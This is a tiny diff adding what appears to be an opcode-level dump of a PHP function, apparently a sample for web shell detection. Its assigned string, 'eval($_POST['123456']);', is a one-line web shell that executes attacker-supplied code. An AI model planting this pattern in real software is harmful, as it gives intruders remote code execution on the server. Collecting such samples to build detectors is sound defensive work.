@@ -1,0 +1,5 @@
+FunctionStart 
+ASSIGN 'eval($_POST['123456']);'
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 1
+FunctionEnd 
